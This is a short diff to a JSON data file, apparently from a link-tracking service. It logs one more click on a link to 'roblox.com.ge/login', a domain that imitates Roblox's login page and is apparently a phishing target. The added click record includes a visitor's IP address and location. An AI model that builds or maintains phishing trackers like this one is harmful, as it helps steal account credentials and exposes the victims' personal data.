@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1304,
+    "useCount": 1305,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10576,6 +10576,14 @@
         "city": "Buon Ma Thuot",
         "flag": "🇻🇳",
         "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777376597094,
+        "ip": "49.148.155.232",
+        "country": "Philippines",
+        "city": "Langatian",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
